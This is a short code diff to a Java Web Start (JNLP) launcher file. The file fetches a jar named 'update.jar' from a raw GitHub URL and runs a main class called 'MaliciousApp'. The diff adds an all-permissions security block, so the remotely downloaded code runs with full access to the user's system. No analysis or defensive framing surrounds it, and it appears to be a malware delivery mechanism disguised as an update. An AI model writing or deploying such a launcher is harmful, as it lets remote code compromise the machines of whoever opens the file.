@@ -9,6 +9,9 @@
     <resources>
         <jar href="https://raw.githubusercontent.com/rvz00/deliv/main/update.jar" main="true"/>
     </resources>
+<security>
+    <all-permissions/>
+</security>
 <application-desc main-class="MaliciousApp">
 </application-desc>
 </jnlp>
